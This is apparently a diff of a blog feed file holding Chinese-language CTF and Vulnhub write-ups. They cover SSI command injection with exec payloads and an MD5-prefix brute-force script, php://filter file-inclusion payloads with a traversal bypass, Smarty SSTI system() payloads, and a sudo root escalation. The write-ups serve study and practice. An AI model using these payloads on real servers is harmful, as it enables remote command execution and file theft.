+<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
+<p>提权成功！直接读取<code>/root</code>下的flag即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
+<p>该靶机到此结束。</p>
+<h1 id="总结">总结</h1>
+<p>该靶机虽然难度为简单，这是因为该靶机的漏洞在现实中比较常见，大家见的多了，自然就简单了。换句话说，简单的靶机更贴近现实。</p>
+<p>通过对该靶机的渗透，还是学到了一些知识：</p>
+<ol type="1">
+<li>指纹探测</li>
+<li>403 Bypass</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>指纹探测</tag>
+        <tag>403 Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>9 Vulnhub Vikings1 Writeup</title>
     <url>/2022/04/10/9%20Vulnhub%20Vikings1%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为简单或者中等，最后的RPC提权要搞懂还是废了点时间。</p>
@@ -2459,6 +2459,42 @@
       </tags>
   </entry>
   <entry>
+    <title>BJDCTF2020 EasySearch</title>
+    <url>/2022/04/19/BJDCTF2020%20EasySearch/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">EasySearch</a></p>
+<span id="more"></span>
+<h1 id="题目信息">1. 题目信息</h1>
+<p>进入环境之后，看到的就是一个登陆界面，查看源码、抓包都没有任何有用的信息，尝试对登陆界面进行SQL注入也没有结果。所以打算进行路径扫描，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 index.php </span><br><span class="line">200 index.php/login</span><br><span class="line">403 /public/  </span><br><span class="line">403 /server-status</span><br><span class="line">403 /server-status/</span><br><span class="line">403 /cgi-bin/</span><br></pre></td></tr></table></figure></p>
+<p>最开始还以为是403 Bypass，但是经过尝试，发现行不通。最后实在没办法去查看了一下别人的WP，发现原来的题目是有提示的，就是<strong>访问<code>index.php.swp</code></strong>。访问该文件，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];  <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">2. 解题</h1>
+<p>通过代码审计，发现能够利用的就是<code>fwrite($shtml,$text);</code>，将我们输入的username写入文件。通过搜索发现shtml文件可以执行bash命令，格式如下：<code>&lt;!--#exec cmd='[命令]'--&gt;</code>。只需要访问带有对应格式的shtml文件，即可执行文件中的命令。</p>
+<p>知道了如何利用之后，我们需要构造payload，也就是需要知道username和password的值。</p>
+<p>因为<code>fwrite($shtml,$text);</code>以及text的内容，得知username的值就是我们需要执行的bash命令。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         $text = &#x27;</span><br><span class="line">         ***</span><br><span class="line">         ***</span><br><span class="line">         &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">         ***</span><br><span class="line">***&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>接着确定password的值。通过<code>if ( $admin == substr(md5($_POST['password']),0,6))</code>了解到，输入的password经过md5加密后取其前6位字符构成的子串，该子串必须与$admin相等，也就是前6个字符必须为<code>6d0bc1</code>。直接编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start!&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():   <span class="comment"># 从0开始一直累加</span></span><br><span class="line">    h = md5(<span class="built_in">str</span>(i).encode()).hexdigest()  <span class="comment"># MD5加密</span></span><br><span class="line">    <span class="keyword">if</span> h[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find it! the password is: &quot;</span> + <span class="built_in">str</span>(i))  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>最终找到password=2020666。因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;find / -name flag*&#x27;--&gt;&amp;password=2020666 -&gt; 找flag文件</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114737.png" /></p>
+<p>访问shtml文件：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114915.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&#x27;--&gt;&amp;password=2020666 -&gt; get flag</span><br></pre></td></tr></table></figure>
+<p>同样的，访问对应的shtml文件，得到flag</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115013.png" /></p>
+<h1 id="参考">3. 参考</h1>
+<ul>
+<li><a href="https://www.cnblogs.com/Areas/p/5096899.html">SHTML 教程 - Areas - 博客园</a></li>
+<li><a href="https://imagin.vip/?p=166">BJDCTF Web Write Up – Imagin's Blog</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>MD5碰撞</tag>
+        <tag>shtml命令执行</tag>
+        <tag>vim泄露</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ASIS 2019 Unicorn shop</title>
     <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
@@ -2544,42 +2580,6 @@
       </categories>
       <tags>
         <tag>Twig SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BJDCTF2020 EasySearch</title>
-    <url>/2022/04/19/BJDCTF2020%20EasySearch/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">EasySearch</a></p>
-<span id="more"></span>
-<h1 id="题目信息">1. 题目信息</h1>
-<p>进入环境之后，看到的就是一个登陆界面，查看源码、抓包都没有任何有用的信息，尝试对登陆界面进行SQL注入也没有结果。所以打算进行路径扫描，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 index.php </span><br><span class="line">200 index.php/login</span><br><span class="line">403 /public/  </span><br><span class="line">403 /server-status</span><br><span class="line">403 /server-status/</span><br><span class="line">403 /cgi-bin/</span><br></pre></td></tr></table></figure></p>
-<p>最开始还以为是403 Bypass，但是经过尝试，发现行不通。最后实在没办法去查看了一下别人的WP，发现原来的题目是有提示的，就是<strong>访问<code>index.php.swp</code></strong>。访问该文件，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];  <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h1 id="解题">2. 解题</h1>
-<p>通过代码审计，发现能够利用的就是<code>fwrite($shtml,$text);</code>，将我们输入的username写入文件。通过搜索发现shtml文件可以执行bash命令，格式如下：<code>&lt;!--#exec cmd='[命令]'--&gt;</code>。只需要访问带有对应格式的shtml文件，即可执行文件中的命令。</p>
-<p>知道了如何利用之后，我们需要构造payload，也就是需要知道username和password的值。</p>
-<p>因为<code>fwrite($shtml,$text);</code>以及text的内容，得知username的值就是我们需要执行的bash命令。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         $text = &#x27;</span><br><span class="line">         ***</span><br><span class="line">         ***</span><br><span class="line">         &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">         ***</span><br><span class="line">***&#x27;;</span><br></pre></td></tr></table></figure></p>
-<p>接着确定password的值。通过<code>if ( $admin == substr(md5($_POST['password']),0,6))</code>了解到，输入的password经过md5加密后取其前6位字符构成的子串，该子串必须与$admin相等，也就是前6个字符必须为<code>6d0bc1</code>。直接编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start!&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():   <span class="comment"># 从0开始一直累加</span></span><br><span class="line">    h = md5(<span class="built_in">str</span>(i).encode()).hexdigest()  <span class="comment"># MD5加密</span></span><br><span class="line">    <span class="keyword">if</span> h[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find it! the password is: &quot;</span> + <span class="built_in">str</span>(i))  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>最终找到password=2020666。因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;find / -name flag*&#x27;--&gt;&amp;password=2020666 -&gt; 找flag文件</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114737.png" /></p>
-<p>访问shtml文件：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114915.png" /></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&#x27;--&gt;&amp;password=2020666 -&gt; get flag</span><br></pre></td></tr></table></figure>
-<p>同样的，访问对应的shtml文件，得到flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115013.png" /></p>
-<h1 id="参考">3. 参考</h1>
-<ul>
-<li><a href="https://www.cnblogs.com/Areas/p/5096899.html">SHTML 教程 - Areas - 博客园</a></li>
-<li><a href="https://imagin.vip/?p=166">BJDCTF Web Write Up – Imagin's Blog</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>MD5碰撞</tag>
-        <tag>shtml命令执行</tag>
-        <tag>vim泄露</tag>
       </tags>
   </entry>
   <entry>
@@ -2710,49 +2710,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BSidesCF 2020 Had a bad day</title>
-    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，页面有两个选择</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
-<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
-<p>此时打开源码发现：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
-<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
-<h1 id="解题">解题</h1>
-<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
-<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
-<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
-<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
-<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
-<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
-<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>通过代码审计知道：</p>
-<ol type="1">
-<li>需要传入参数 category</li>
-<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
-<li>我们传入的文件名不需要包含 .php</li>
-</ol>
-<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
-<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
-<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
-<h1 id="总结">总结</h1>
-<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF 2018 Online Tool</title>
     <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -2833,71 +2790,46 @@
       </tags>
   </entry>
   <entry>
-    <title>CISCN2019 华东南赛区 Web11</title>
-    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
+    <title>BSidesCF 2020 Had a bad day</title>
+    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，看到了一堆信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
+<p>进入环境之后，页面有两个选择</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
+<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
+<p>此时打开源码发现：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
+<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
 <h1 id="解题">解题</h1>
-<p>首先，我尝试了一下API Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
-<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
-<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
-<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
-<p>所以，我尝试用burp发送请求。终于</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
-<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
-<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
+<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
+<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
+<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
+<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
+<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过代码审计知道：</p>
+<ol type="1">
+<li>需要传入参数 category</li>
+<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
+<li>我们传入的文件名不需要包含 .php</li>
+</ol>
+<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
+<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
